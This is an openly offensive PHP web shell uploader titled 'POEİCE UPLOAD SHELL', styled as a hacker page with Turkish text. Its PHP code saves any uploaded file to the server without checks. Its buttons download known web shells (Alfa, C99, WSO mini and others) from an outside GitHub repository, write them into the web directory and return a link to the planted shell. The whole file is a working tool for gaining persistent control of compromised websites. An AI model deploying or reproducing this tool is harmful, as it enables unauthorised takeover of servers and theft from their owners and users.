<!DOCTYPE html>
<html>
<head>
    <style>
    
    /* POEİCE UPLOAD SHELL*/
        @keyframes glitch {
            0% { transform: none; }
            20% { transform: translate(-1px, -1px); }
            40% { transform: translate(1px, 1px); }
            60% { transform: translate(-1px, 1px); }
            80% { transform: translate(1px, -1px); }
            100% { transform: none; }
        }
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            margin: 0;
            padding: 0;
        }
        .upload-form {
            background-color: #111;
            width: 400px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #0f0;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        .upload-form h2 {
            text-align: center;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .upload-form p {
            color: #0f0;
            text-shadow: 0 0 3px #0f0;
        }
        .upload-form input[type="file"] {
            margin-bottom: 10px;
            background-color: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 5px;
            border-radius: 5px;
        }
        .upload-form input[type="file"]::placeholder {
            color: #0f0;
        }
        .upload-form input[type="submit"] {
            background-color: #f00;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            animation: glitch 0.2s infinite alternate;
        }
        .upload-form input[type="submit"]:hover {
            background-color: #ff4444;
        }
        .message {
            text-align: center;
            margin-top: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .message a {
            color: #00f;
            text-decoration: none;
        }
        .message a:hover {
            text-decoration: underline;
        }
        .hack-buttons {
            text-align: center;
            margin-top: 20px;
        }
        .hack-button {
            background-color: #f00;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 5px;
            animation: glitch 0.2s infinite alternate;
        }
        .hack-button:hover {
            background-color: #ff4444;
        }
        .poeice {
            text-align: center;
            margin-top: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
            animation: glitch 0.2s infinite alternate;
        }
        body{
            position: relative;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    background: #000 url(https://www.turkhacks.com/styles/darkgreen/bg.gif);
        }
    </style>
</head>
<body>
    <div class="upload-form">
        <h2>Yükleme Formu</h2>
        <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <p>Bir dosya seç ve avla :)</p>
            <input type="file" name="uploaded_file" placeholder="Hedef dosya seç...">
            <input type="submit" value="Yükle">
        </form>
        <div class="message">
            Poeice THS
        </div>
<div class="hack-buttons">
    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/3.php')">C99 Yükle</button>
    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/4.php')">WsoMini Yükle</button>
    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
</div>
<br>
<img src="https://i.hizliresim.com/920h03s.png" style="width: 100%;">
<script>
    function uploadFile(url) {
        // Get the form element
        var form = document.querySelector('.upload');

        // Append a hidden input field with the URL value
        var urlInput = document.createElement('input');
        urlInput.type = 'hidden';
        urlInput.name = 'url';
        urlInput.value = url;
        form.appendChild(urlInput);

        // Submit the form
        form.submit();
    }
</script>


<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["url"])) {
        $url = $_POST["url"];
        $fileContent = file_get_contents($url);
        if ($fileContent !== false) {
            $fileName = basename($url);
            $uploadDirectory = "";
            if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
                echo "<div class='message'>Dosya başarıyla yüklendi. Shell linki: <a href='$uploadDirectory$fileName'  target='_blank'>$uploadDirectory$fileName</a></div>";
            } else {
                echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
            }
        } else {
            echo "<div class='message'>Dosya indirilirken bir hata oluştu!</div>";
        }
    } else {
        if (!empty($_FILES['uploaded_file'])) {
            $uploadKlasoru = "";
            $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
                echo "<div class='message'>Dosya " . basename($_FILES['uploaded_file']['name']) . " başarıyla hacklendi. <a href='$dosyaYolu' target='_blank'>Dosyayı Aç</a></div>";
            } else {
                echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
            }
        }
    }
}
?>

</body>
</html>
